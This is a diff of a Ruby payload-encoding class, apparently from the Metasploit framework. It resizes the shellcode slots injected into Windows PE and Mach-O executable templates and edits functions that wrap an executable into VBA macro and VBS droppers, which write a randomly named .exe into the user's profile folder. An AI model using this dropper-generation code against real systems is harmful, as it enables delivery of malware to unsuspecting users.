@@ -62,12 +62,12 @@ class EXE
 		pe = fd.read(fd.stat.size)
 		fd.close
 
-		if(code.length < 8192)
-			code << Rex::Text.rand_text(8192-code.length)
+		if(code.length < 2048)
+			code << Rex::Text.rand_text(2048-code.length)
 		end
 		
 		bo = pe.index('PAYLOAD:')
-		pe[bo,  8192] = code if bo
+		pe[bo,  2048] = code if bo
 		pe[136,    4] = [rand(0x100000000)].pack('V')
 
 		ci = pe.index("\x31\xc9" * 160)
@@ -86,7 +86,7 @@ class EXE
 		pe[xi,4] = [0xe0300020].pack('V')
 		
 		# Add a couple random bytes for fun
-		pe << Rex::Text.rand_text(rand(4096)+128)
+		pe << Rex::Text.rand_text(rand(64)+4)
 
 		return pe
 	end
@@ -99,7 +99,7 @@ class EXE
 		fd.close
 
 		bo = pe.index('PAYLOAD:')
-		pe[bo, 8192] = [code].pack('a8192') if bo
+		pe[bo, 2048] = [code].pack('a2048') if bo
 
 		bo = pe.index('SERVICENAME')
 		pe[bo, 11] = [name].pack('a11') if bo
@@ -119,9 +119,7 @@ class EXE
 		bo = mo.index( "\x90\x90\x90\x90" * 1024 )
 		co = mo.index( " " * 512 )
 
-		mo[bo, 8192] = [code].pack('a8192') if bo
-		mo[co, 512]  = [note].pack('a512') if co
-
+		mo[bo, 2048] = [code].pack('a2048') if bo
 		return mo
 	end
 
@@ -135,8 +133,7 @@ class EXE
 		bo = mo.index( "\x90\x90\x90\x90" * 1024 )
 		co = mo.index( " " * 512 )
 
-		mo[bo, 8192] = [code].pack('a8192') if bo
-		mo[co, 512]  = [note].pack('a512') if co
+		mo[bo, 2048] = [code].pack('a2048') if bo
 
 		return mo
 	end
@@ -151,8 +148,7 @@ class EXE
 		bo = mo.index( "\x90\x90\x90\x90" * 1024 )
 		co = mo.index( " " * 512 )
 
-		mo[bo, 8192] = [code].pack('a8192') if bo
-		mo[co, 512]  = [note].pack('a512') if co
+		mo[bo, 2048] = [code].pack('a2048') if bo
 
 		return mo
 	end
@@ -167,13 +163,13 @@ class EXE
 		bo = mo.index( "\x90\x90\x90\x90" * 1024 )
 		co = mo.index( " " * 512 )
 
-		mo[bo, 8192] = [code].pack('a8192') if bo
-		mo[co, 512]  = [note].pack('a512') if co
+		mo[bo, 2048] = [code].pack('a2048') if bo
 
 		return mo
 	end
 
-	def self.to_exe_vba(exe='')
+	def self.to_exe_vba(exes='')
+		exe = exes.unpack('C*')
 		vba = ""
 		pcs = (exe.length/2000)+1
 		idx = 0
@@ -207,7 +203,7 @@ class EXE
 		vba << "\tDim #{var_datnr} As Integer\r\n"
 		vba << "\tDim #{var_lname} As String\r\n"
 		vba << "\tDim #{var_lpath} As String\r\n"
-		vba << "\t#{var_lname} = \"#{rand_text_alpha(rand(8)+8)}.exe\"\r\n"
+		vba << "\t#{var_lname} = \"#{Rex::Text.rand_text_alpha(rand(8)+8)}.exe\"\r\n"
 		vba << "\t#{var_lpath} = Environ(\"USERPROFILE\")\r\n"
 		vba << "\tChDrive (#{var_lpath})\r\n"
 		vba << "\tChDir (#{var_lpath})\r\n"
@@ -237,9 +233,10 @@ class EXE
 		to_exe_vba(to_win32pe(framework, code))
 	end
 
-	def self.to_exe_vbs(exe = '')
+	def self.to_exe_vbs(exes = '')
+		exe = exes.unpack('C*')
 		vbs = ""
-
+		
 		var_bytes =  Rex::Text.rand_text_alpha(rand(8)+8)
 		var_fname =  Rex::Text.rand_text_alpha(rand(8)+8)
 		var_func =  Rex::Text.rand_text_alpha(rand(8)+8)
@@ -249,7 +246,7 @@ class EXE
 
 		vbs << "Function #{var_func}()\r\n"
 
-		vbs << "#{var_bytes} = Chr(&H#{("%02x" % exe[0])})"
+		vbs << "#{var_bytes} = Chr(&H#{("%02x" % exe)})"
 		
 		1.upto(exe.length) do |byte|
 			vbs << "&Chr(&H#{("%02x" % exe[byte])})" 
